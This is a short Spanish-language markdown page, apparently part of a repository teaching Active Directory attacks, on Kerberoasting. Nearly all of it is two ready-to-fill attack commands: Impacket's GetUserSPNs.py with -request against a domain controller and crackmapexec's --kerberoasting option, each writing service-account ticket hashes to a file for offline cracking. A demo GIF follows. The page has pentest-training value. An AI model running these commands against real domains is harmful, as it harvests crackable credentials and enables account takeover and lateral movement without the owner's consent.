# Obtener usuarios kerberoasteables

```Bash
# Obtención de hash de usuarios con el SPN habilitado
python /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request -dc-ip <DC ip> <nombre dominio completo>/<user>:<pass> -outputfile kerberoasting.hashes

# Hash con crackmapexec
crackmapexec ldap <IP ldap> -u '<user>' -p '<pass>' -d <nombre dominio completo> --kerberoasting <output file>

```

![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/kerberoasting/files/vid.gif?raw=true "Obteniendo hashes de usuarios con SPN habilitado")
